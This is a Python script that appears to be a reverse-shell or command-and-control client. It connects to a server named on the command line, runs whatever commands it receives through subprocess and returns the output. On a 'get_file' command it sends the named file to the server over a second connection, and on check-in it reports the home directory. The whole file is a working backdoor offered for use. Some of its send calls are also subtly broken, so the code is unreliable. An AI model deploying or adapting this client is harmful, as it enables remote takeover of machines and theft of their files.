#!/usr/bin/python3
import socket, sys, os, subprocess, argparse, time
parser = argparse.ArgumentParser(description='q*bert says hello')
parser.add_argument('-p', dest='port', required=True, type=int)
parser.add_argument('-s', dest='server', required=True)
args = parser.parse_args()

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    s.connect((args.server, args.port))
    while True:
        try:
            received = s.recv(buff).strip().split()
            command = [ str(x, 'utf-8') for x in received ]
            if 'Arsenal' in command:
                output = b'Client initial checkin\n'
                s.send(bytes(len(output)))
                s.send(output)
                output = bytes("Homedir: " + os.environ.get('HOME'), "utf-8")
                s.send(bytes(len(output)))
                s.send(output)
            elif 'get_file' in command:
                fs=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                fs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                buff = 4096
                fs.connect((args.server, 12))
                with open(command[1]) as f:
                    fs.sendall(bytes(f.read()))
            else:
                print(command)
                output = subprocess.run(command, stdout=subprocess.PIPE)
                s.send(len(output.stdout))
                s.send(bytes(output.stdout))
        except OSError as err:
            print("{0}\n".format(err))

if __name__ == '__main__':
    main()
